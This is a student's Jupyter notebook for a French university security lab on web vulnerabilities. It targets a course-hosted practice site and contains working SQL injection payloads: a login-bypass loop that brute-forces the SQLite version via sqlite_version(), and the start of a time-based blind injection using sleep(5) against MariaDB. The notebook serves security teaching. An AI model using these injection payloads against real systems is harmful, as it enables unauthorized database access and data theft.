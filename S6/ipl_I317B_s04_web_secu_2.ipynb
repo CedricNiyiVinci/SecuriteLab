{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 4 : Vulnérabilitées web (2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1:\n",
    "Revenons un peux en arrière sur le site de notre mauvais développeur. Nous savons que le site utilise sqlite comme système de gestion de base de donnée mais nous aimerions en identifier la version. Utilisez le site de l'exercice 1 pour récupérer cette information.\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/22/s03/ex1/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: requests in c:\\programdata\\anaconda3\\lib\\site-packages (2.27.1)\n",
      "Requirement already satisfied: bs4 in c:\\users\\20201652\\appdata\\roaming\\python\\python39\\site-packages (0.0.1)\n",
      "Requirement already satisfied: idna<4,>=2.5 in c:\\programdata\\anaconda3\\lib\\site-packages (from requests) (3.3)\n",
      "Requirement already satisfied: urllib3<1.27,>=1.21.1 in c:\\programdata\\anaconda3\\lib\\site-packages (from requests) (1.26.9)\n",
      "Requirement already satisfied: charset-normalizer~=2.0.0 in c:\\programdata\\anaconda3\\lib\\site-packages (from requests) (2.0.4)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in c:\\programdata\\anaconda3\\lib\\site-packages (from requests) (2021.10.8)\n",
      "Requirement already satisfied: beautifulsoup4 in c:\\programdata\\anaconda3\\lib\\site-packages (from bs4) (4.11.1)\n",
      "Requirement already satisfied: soupsieve>1.2 in c:\\programdata\\anaconda3\\lib\\site-packages (from beautifulsoup4->bs4) (2.3.1)\n"
     ]
    }
   ],
   "source": [
    "!pip3 install --user requests bs4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'bs4.element.Tag'>\n",
      "['3.39.4', '3.39.3', '3.39.2', '3.39.1', '3.39.0', '3.38.5', '3.38.4', '3.38.3', '3.38.2', '3.38.1', '3.38.0', '3.37.2', '3.37.1', '3.37.0', '3.36.0', '3.35.5', '3.35.4', '3.35.3', '3.35.2', '3.35.1', '3.35.0', '3.34.1', '3.34.0', '3.33.0', '3.32.3', '3.32.2', '3.32.1', '3.32.0', '3.31.1', '3.31.0', '3.30.1', '3.30.0', '3.29.0', '3.28.0', '3.27.2', '3.27.1', '3.27.0', '3.26.0', '3.25.3', '3.25.2', '3.25.1', '3.25.0', '3.24.0', '3.23.1', '3.23.0', '3.22.0', '3.21.0', '3.20.1', '3.20.0', '3.18.2', '3.18.1', '3.19.3', '3.19.2', '3.19.1', '3.19.0', '3.18.0', '3.17.0', '3.16.2', '3.16.1', '3.16.0', '3.15.2', '3.15.1', '3.15.0', '3.14.2', '3.14.1', '3.14', '3.13.0', '3.12.2', '3.12.1', '3.9.3', '3.12.0', '3.11.1', '3.11.0', '3.10.2', '3.10.1', '3.10.0', '3.9.2', '3.9.1', '3.9.0', '3.8.11.1', '3.8.11', '3.8.10.2', '3.8.10.1', '3.8.10', '3.8.9', '3.8.8.3', '3.8.8.2', '3.8.8.1', '3.8.8', '3.8.7.4', '3.8.7.3', '3.8.7.2', '3.8.7.1', '3.8.6.1', '3.8.7', '3.8.6', '3.8.5', '3.8.4.3', '3.8.4.2', '3.8.4.1', '3.8.4', '3.8.3.1', '3.8.3', '3.8.2', '3.8.1', '3.8.0.2', '3.8.0.1', '3.8.0', '3.7.17', '3.7.16.2', '3.7.16.1', '3.7.16', '3.7.15.2', '3.7.15.1', '3.7.15', '3.7.14.1', '3.7.14', '3.7.13', '3.7.12.1', '3.7.12', '3.7.12', '3.7.12', '3.7.11', '3.7.10', '3.7.9', '3.7.8', '3.7.7.1', '3.7.7', '3.7.6.3', '3.7.6.2', '3.7.6.1', '3.7.6', '3.7.5', '3.7.4', '3.7.3', '3.7.2', '3.7.1', '3.7.0.1', '3.7.0', '3.6.23.1', '3.6.23', '3.6.22', '3.6.21', '3.6.20', '3.6.16.1', '3.6.19', '3.6.18', '3.6.17', '3.6.16', '3.6.15', '3.6.14.2', '3.6.14.1', '3.6.14', '3.6.13', '3.6.12', '3.6.11', '3.6.10', '3.6.9', '3.6.8', '3.6.7', '3.6.6.2', '3.6.6.1', '3.6.6', '3.6.5', '3.6.4', '3.6.3', '3.6.2', '3.6.1', '3.6.0', '3.5.9', '3.5.8', '3.5.7', '3.5.6', '3.5.5', '3.5.4', '3.5.3', '3.5.2', '3.5.1', '3.5.0', '3.4.2', '3.4.1', '3.4.0', '3.3.17', '3.3.16', '3.3.15', '3.3.14', '3.3.13', '3.3.12', '3.3.11', '3.3.10', '3.3.9', '3.3.8', '3.3.7', '3.3.6', '3.3.5', '3.3.4', '3.3.3', '3.3.2', '3.3.1', '3.3.0', '2.8.17', '3.2.8', '3.2.7', '3.2.6', '3.2.5', '3.2.4', '3.2.3', '3.2.2', '3.2.1', '3.2.0', '3.1.6', '3.1.5', '3.1.4', '3.1.3.1', '3.1.3', '3.1.2', '2.8.16', '3.1.1', '3.1.0', '3.0.8', '3.0.7', '3.0.6', '3.0.5', '3.0.4', '3.0.3', '2.8.15', '3.0.2', '3.0.1', '3.0.0', '2.8.14', '2.8.13', '2.8.12', '2.8.11', '2.8.10', '2.8.9', '2.8.8', '2.8.7', '2.8.6', '2.8.5', '2.8.4', '2.8.3', '2.8.2', '2.8.1', '2.8.0', '2.7.6', '2.7.5', '2.7.4', '2.7.3', '2.7.2', '2.7.1', '2.7.0', '2.6.3', '2.6.2', '2.6.1', '2.6.0', '2.5.6', '2.5.5', '2.5.4', '2.5.3', '2.5.2', '2.5.1', '2.5.0', '2.4.12', '2.4.11', '2.4.10', '2.4.9', '2.4.8', '2.4.7', '2.4.6', '2.4.5', '2.4.4', '2.4.3', '2.4.2', '2.4.1', '2.4.1', '2.4.0', '2.3.3', '2.3.2', '2.3.1', '2.3.0', '2.2.5', '2.2.4', '2.2.3', '2.2.2', '2.2.1', '2.2.0', '2.1.7', '2.1.6', '2.1.5', '2.1.4', '2.1.3', '2.1.2', '2.1.1', '2.1.0', '2.0.8', '2.0.7', '2.0.6', '2.0.5', '2.0.4', '2.0.3', '2.0.2', '2.0.1', '2.0.0', '1.0.32', '1.0.31', '1.0.30', '1.0.29', '1.0.28', '1.0.27', '1.0.26', '1.0.25', '1.0.24', '1.0.23', '1.0.22', '1.0.21', '1.0.20', '1.0.19', '1.0.18', '1.0.17', '1.0.16', '1.0.15', '1.0.14', '1.0.13', '1.0.12', '1.0.10', '1.0.9', '1.0.8', '1.0.5', '1.0.4', '1.0.3', '1.0.1', '1.0']\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "sql_req = requests.get(\"https://www.sqlite.org/draft/chronology.html\")\n",
    "sql_html = sql_req.text\n",
    "soup = BeautifulSoup(sql_html)\n",
    "\n",
    "# pour récupérer le contenu de la balise <title> :\n",
    "table_version = soup.find(\"table\", {\"id\": \"chrontab\"}).find(\"tbody\")\n",
    "print(type(table_version))\n",
    "list_version = []\n",
    "for tr in table_version.find_all(\"tr\"):\n",
    "\n",
    "    all_tr = tr.find_all(\"td\")\n",
    "    #print(all_tr[1].get_text())\n",
    "    list_version.append(all_tr[1].get_text())\n",
    "\n",
    "print(list_version)\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.39.4\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.39.3\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.39.2\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.39.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.39.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.38.5\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.38.4\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.38.3\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.38.2\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.38.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.38.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.37.2\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.37.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.37.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.36.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.35.5\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.35.4\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.35.3\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.35.2\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.35.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.35.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.34.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.34.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.33.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.32.3\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.32.2\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.32.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.32.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.31.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.31.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.30.1\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.30.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.29.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.28.0\\';--'}\n",
      "{'login': 'admin', 'password': '\" or sqlite_version()=\\'3.27.2\\';--'}\n",
      "Exercice réussi\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "for i in list_version:\n",
    "    data_post={\"login\": \"admin\", \"password\": f'\" or sqlite_version()=\\'{i}\\';--'}\n",
    "    page = requests.post(\n",
    "        \"http://labosecuipl.alwaysdata.net/22/s03/ex1/\",\n",
    "        data=data_post  #TODO\n",
    "    )\n",
    "    print(data_post)\n",
    "    if \"Good job\" in page.text:\n",
    "        print(\"Exercice réussi\")\n",
    "        break\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Pour ce dernier exercice, vous allez travailler un peu à l'aveugle. En effet, la page suicitant notre intérêt cette fois-ci ne contient pas grand chose à part à un bouton ... mais elle est injectable (promis) !\n",
    "\n",
    "À vous de trouvez comment et de récupérer la version du système de gestion de base de donnée : http://labosecuipl.alwaysdata.net/22/s04/ex2/\n",
    "\n",
    "Tips:\n",
    "  - Cette fois-ci, c'est plus du sqlite : https://mariadb.com/kb/en/version/\n",
    "  - Et vous travaillez à l'aveugle ;-)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.19864153861999512\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "\n",
    "start = time.time()\n",
    "\n",
    "button_req = requests.post(\n",
    "    \"http://labosecuipl.alwaysdata.net/22/s04/ex2/\",\n",
    "    params={\"id\": '3 AND (FALSE OR sleep(5));--'}\n",
    "    )\n",
    "print(time.time() - start)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.12 ('base')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  },
  "vscode": {
   "interpreter": {
    "hash": "ad2bdc8ecc057115af97d19610ffacc2b4e99fae6737bb82f5d7fb13d2f2c186"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
